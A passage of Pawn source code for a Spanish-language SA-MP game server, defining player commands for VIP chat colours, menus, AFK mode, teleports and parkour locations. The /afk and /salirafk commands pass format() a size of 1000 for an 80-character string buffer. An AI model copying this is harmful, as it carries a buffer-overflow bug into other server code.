	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes el tag desactivado.");
	return 1;
}
CMD:cnegro(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorNegro[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat negro activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:crojo(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorRojo[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat rojo activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cazul(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorAzul[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat azul activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cverde(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorVerde[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat verde activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:camarillo(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorAmarillo[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat amarillo activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:crosa(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorRosa[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat rosa activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cceleste(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorCeleste[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat celeste activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cnaranja(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorNaranja[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat naranja activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cvioleta(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorVioleta[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat violeta activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cdorado(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorDorado[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat dorado activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cmarron(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorMarron[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat marron activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:cgris(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 0) {
            if(TagActivado[playerid] == 0) {
				PlayerInfo[playerid][DesactivarChat] = 1;
				ColorGris[playerid] = 1;
				ChatColorActivado[playerid] = 1;
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat gris activado.");
            } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener el tag de vip, admin y owner desactivados.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes un chat de color activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:dchatcolor(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(ChatColorActivado[playerid] == 1) {
			PlayerInfo[playerid][DesactivarChat] = 0;
			ColorNegro[playerid] = 0;
			ColorRojo[playerid] = 0;
			ColorAzul[playerid] = 0;
			ColorVerde[playerid] = 0;
			ColorAmarillo[playerid] = 0;
			ColorRosa[playerid] = 0;
			ColorCeleste[playerid] = 0;
			ColorNaranja[playerid] = 0;
			ColorVioleta[playerid] = 0;
			ColorDorado[playerid] = 0;
			ColorMarron[playerid] = 0;
			ColorGris[playerid] = 0;
			ChatColorActivado[playerid] = 0;
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Chat de color desactivado.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya tienes el chat de color desactivado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:climas(playerid,params[])
{
    ShowPlayerDialog(playerid, Climas, DIALOG_STYLE_LIST, "Climas", "{FF0000}*{FFFFFF} Tormentoso\n{FF0000}*{FFFFFF} Niebla\n{FF0000}*{FFFFFF} Tormenta de arena\n{FF0000}*{FFFFFF} Nublado\n{FF0000}*{FFFFFF} Cielo rosa\n{FF0000}*{FFFFFF} Cielo rojo\n{FF0000}*{FFFFFF} Cielo morado\n{FF0000}*{FFFFFF} Cielo Negro\n{FF0000}*{FFFFFF} Cielo Azul por la mañana\n{FF0000}*{FFFFFF} Cielo Azul por la Tarde\n{FF0000}*{FFFFFF} Cielo Azul por la noche", "Seleccionar", "Salir");
	return 1;
}
CMD:velocimetro(playerid,params[])
{
	if(speedo[playerid] == 1)
	{
		dashboardoff(playerid);
		SendClientMessage(playerid,red,"|Velocimetro| »{EAEAEA} Velocimetro desactivado.");
	}else{
		dashboardon(playerid);
		SendClientMessage(playerid,red,"|Velocimetro| »{EAEAEA} Velocimetro activado.");
	}
return 1;
}

CMD:holatodos(playerid,params[])
{
	new Hola[46];
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(Hola,sizeof(Hola),"~g~%s:~n~~w~HOLA A TODOS", PlayerName);
	GameTextForAll(Hola,5000,3);
	return 1;
}
CMD:chautodos(playerid,params[])
{
	new Chau[46];
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(Chau,sizeof(Chau),"~g~%s:~n~~w~CHAU A TODOS", PlayerName);
	GameTextForAll(Chau,5000,3);
	return 1;
}
CMD:colores(playerid,params[])
{
    ShowPlayerDialog(playerid, DIALOGID2, DIALOG_STYLE_LIST, "Colores", "{000000}Negro\nBlanco\n{FF0000}Rojo\n{0000FF}Azul\n{00FF00}Verde\n{FFFF00}Amarillo\n{FF69B4}Rosa\n{00BFFF}Celeste\n{FFA500}Naranja\n{9932CC}Violeta\n{FFD700}Dorado\n{A52A2A}Marron\n{BEBEBE}Gris", "Seleccionar", "Salir");
	return 1;
}
CMD:objetos(playerid,params[])
{
	#pragma unused params
	new string[475];
	format(string,sizeof(string),"{FF0000}*{FFFFFF} Laser en la cabeza\n{FF0000}*{FFFFFF} Mascara de dragon\n{FF0000}*{FFFFFF} Advertencia de luz sobre la cabeza\n{FF0000}*{FFFFFF} Pelota de BasketBall\n{FF0000}*{FFFFFF} Pelota de playa\n{FF0000}*{FFFFFF} Maletin\n{FF0000}*{FFFFFF} Bola 1\n{FF0000}*{FFFFFF} Bola 2\n{FF0000}*{FFFFFF} Bola 3",string);
	format(string, sizeof string, "%s\n{FF0000}*{FFFFFF} Logo samp\n{FF0000}*{FFFFFF} Bolsa con dinero\n{FF0000}*{FFFFFF} Ninja\n{FF0000}*{FFFFFF} Discoteca\n{FF0000}*{FFFFFF} Fuego\n{FF0000}Siguiente",string);
	ShowPlayerDialog(playerid,Obje,DIALOG_STYLE_LIST,"Objetos 1",string,"Seleccionar","Salir");
	return 1;
}
CMD:quitarobjetos(playerid,params[])
{
	for(new i;i<5;i++) RemovePlayerAttachedObject(playerid,i);
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has removido todos los objetos.");
	return 1;
}
CMD:estilos(playerid,params[])
{
    ShowPlayerDialog(playerid, Estilos_Peleas, DIALOG_STYLE_LIST, "Estilos de Pelea", "{FF0000}*{FFFFFF} Normal\n{FF0000}*{FFFFFF} Boxeo\n{FF0000}*{FFFFFF} KungFu\n{FF0000}*{FFFFFF} Patadas\n{FF0000}*{FFFFFF} Codos", "Seleccionar", "Cancelar");
	return 1;
}
CMD:paracaidas(playerid,params[])
{
	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Paracaidas!");
	GivePlayerWeapon(playerid, 46, 1);
	return 1;
}
CMD:para(playerid,params[])
{
    SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Paracaidas!");
	GivePlayerWeapon(playerid, 46, 1);
	return 1;
}
CMD:jet(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=1 || IsPlayerAdmin(playerid)) {
	SetPlayerSpecialAction(playerid, 2);
	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Jetpack!");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:dia(playerid,params[])
{
	SetPlayerTime(playerid, 12, 0);
	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has cambiado tu tiempo a de {919770}Dia!");
	return 1;
}
CMD:noche(playerid,params[])
{
	SetPlayerTime(playerid, 5, 0);
	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has cambiado tu tiempo a de {919770}Noche!");
	return 1;
}
CMD:vida(playerid,params[])
{
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=1 || IsPlayerAdmin(playerid)) {
	if(UsarVida[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 1 minuto para volver a llenarte la vida.");
    SetTimerEx("AntiFloodVida", 60000, false, "i", playerid);
    UsarVida[playerid] = 1;
	SetPlayerHealth(playerid,99.0);
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Te has llenado la {919770}Vida!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:armadura(playerid,params[])
{
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=1 || IsPlayerAdmin(playerid)) {
	if(UsarArmadura[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 1 minuto para volver a llenarte la armadura.");
    SetTimerEx("AntiFloodArmadura", 60000, false, "i", playerid);
    UsarArmadura[playerid] = 1;
	SetPlayerArmour(playerid,99.0);
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Te has llenado la {919770}Armadura!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}



CMD:menuimagen(playerid,params[]){
	#pragma unused params
	if((dUserINT(PlayerName2(playerid)).("MenuImagen")) == 0)
	{
		dUserSetINT(PlayerName2(playerid)).("MenuImagen", 1);
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Menu con imagenes activado");
	}else{
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} Menu con imagenes desactivado");
		dUserSetINT(PlayerName2(playerid)).("MenuImagen", 0);
	}
	return 1;
}
CMD:packs(playerid,params[])
{
	#pragma unused params
	ShowPlayerDialog(playerid, packs, DIALOG_STYLE_LIST, "Lista de Packs", "|Pack 1| Recortada - Uzi - M4 - Sniper\n|Pack 2| Recortada - Tec9 - Ak47 - Sniper\n|Pack 3| M4 - Sniper - Colt45 - Mp5\n|Pack 4| Combat Shotgun - Tec9 - M4 - Spray\n|Pack 5| Colt45 - Recortada - Mp5\n|Pack 6| Colt45 - Tecs - M4 - Spray - Sniper", "Obtener", "Cancelar");
	return 1;
}

CMD:armas(playerid,params[])
{
	#pragma unused params
	if((dUserINT(PlayerName2(playerid)).("MenuImagen")) == 1)
	{
		ShowModelSelectionMenu(playerid, armaslist, "~w~Armas", DIALOG_BG_COLOR, PREV_BG_COLOR, PREV_BG_COLOR2);
	}else{
		ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	return 1;
}
CMD:alaser(playerid, params[])
{
	SetPVarInt(playerid, "laser", 1);
	SetPVarInt(playerid, "color", GetPVarInt(playerid, "color"));
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Laser activado.");
	return 1;
}
CMD:dlaser(playerid, params[])
{
	SetPVarInt(playerid, "laser", 0);
	RemovePlayerAttachedObject(playerid, 0);
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Laser desactivado.");
	return 1;
}
CMD:afk(playerid,params[])
{
    if(afk[playerid] == 1)
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en modo AFK, usa {C0C0C0}/SalirAFK {EAEAEA}para volver al juego.");
	}
	else
	{
		new string[80];
		afk[playerid] = 1;
		currentcolor[playerid] = GetPlayerColor(playerid);
		currentvw = GetPlayerVirtualWorld(playerid);
		SetPlayerVirtualWorld(playerid, AFKVW);
		TogglePlayerControllable(playerid, 0);
		GameTextForPlayer(playerid, "~w~Modo AFK~n~~r~Activado", 3000, 5);
		new PlayerName[MAX_PLAYER_NAME];
		GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
		format(string, 1000, "|AFK| »{0080FF} %s {EAEAEA}entro en modo AFK.{C0C0C0} (/AFK)", PlayerName);
		SendClientMessageToAll(red, string);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Estas en modo AFK, usa {C0C0C0}/SalirAFK {EAEAEA}para volver al juego.");
		return 1;
	}
	return 1;
}
CMD:salirafk(playerid,params[])
{
    if(afk[playerid] == 1)
	{
		new string[80];
		afk[playerid] = 0;
		SetPlayerVirtualWorld(playerid, currentvw);
		TogglePlayerControllable(playerid, 1);
		GameTextForPlayer(playerid, "~w~Modo AFK~n~~r~Desactivado", 3000, 5);
		new PlayerName[MAX_PLAYER_NAME];
		GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
		format(string, 1000, "|AFK| »{0080FF} %s {EAEAEA}salio del modo AFK.{C0C0C0} (/SalirAFK)", PlayerName);
		SendClientMessageToAll(red, string);
		return 1;
	}
	else SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estas en modo AFK, usa {C0C0C0}/AFK {EAEAEA}Para entrar en modo AFK.");
	return 1;
}
CMD:dtp(playerid,params[])
{
    if(Informacion[playerid][Bloqueado] == 0)
	{
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Ahora no pueden hacer Tp hacia ti.");
		Informacion[playerid][Bloqueado] = 1;
		return 1;
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya has prohibido que hagan tp hacia ti.");
}

CMD:atp(playerid,params[])
{
    if(Informacion[playerid][Bloqueado] == 1)
	{
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Ahora si pueden hacer Tp hacia ti.");
		Informacion[playerid][Bloqueado] = 0;
		return 1;
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya has permitido que hagan tp hacia ti.");
}

CMD:tp(playerid,params[])
{
    new jugador;
	jugador = strval(params);
    if(isnull(params)) return SendClientMessage(playerid, COLOR_RED, "{FF0000}|Usa| »{EAEAEA} /Tp [JugadorID]");
	if (strval(params) == playerid) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes hacer Tp hacia ti mismo.");
	if (IsPlayerConnected(jugador))
	{
		if(Informacion[jugador][Bloqueado] == 0)
		{
			format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto hacia el jugador {00BFFF}%s.",pName(playerid), pName(jugador));
			SendClientMessageToAll(red, fString);
			new Float:x, Float:y, Float:z;
			GetPlayerPos(jugador, x, y, z);
			TeleportPlayer(playerid, x + 2, y, z);
			return 1;
		}
		else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador prohibio que hagan Tp hacia el. Dile que active su Tp con {C0C0C0}/Atp.");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
}

CMD:sr(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super rampa. {00BFFF}(/Sr)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Super Rampa",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,-12304.8594,-1631.2212,8753.4307);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk1(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 1. {00BFFF}(/Pk1)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 1",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 3029.3159,-1918.8994,599.0370);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk2(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 2. {00BFFF}(/Pk2)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 2",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 2582.1992,-1346.4513,232.2539);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk3(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 3. {00BFFF}(/Pk3)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 3",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 2095.3699,-1775.5961,274.6510);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk4(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 4. {00BFFF}(/Pk4)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 4",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 2768.2642,-2743.5884,2460.0815);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk5(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 5. {00BFFF}(/Pk5)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 5",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 1441.1346,-1702.2529,913.3906);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:pk6(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour 6. {00BFFF}(/Pk6)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Parkour 6",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, -2928.6538,-1876.9332,7.0414);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:nrgpk(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour de nrg. {00BFFF}(/Nrgpk)",PlayerName);
	GameTextForPlayer(playerid, "~w~Bienvenido a ~n~~r~Parkour de NRG", 2500, 3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, 2468.5740,-1415.8828,34.5800);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:nrgpk2(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour de nrg 2. {00BFFF}(/Nrgpk2)",PlayerName);
	GameTextForPlayer(playerid, "~w~Bienvenido a ~n~~r~Parkour de NRG 2", 2500, 3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid,2705.0793, -1428.2927, 54.5410);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:monsterpk1(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour monster 1. {00BFFF}(/Monsterpk1)",PlayerName);
	GameTextForPlayer(playerid, "~w~Bienvenido a ~n~~r~Monster Parkour 1", 2500, 3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, -2892.3167,67.4356,4.7666);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}


CMD:monsterpk2(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
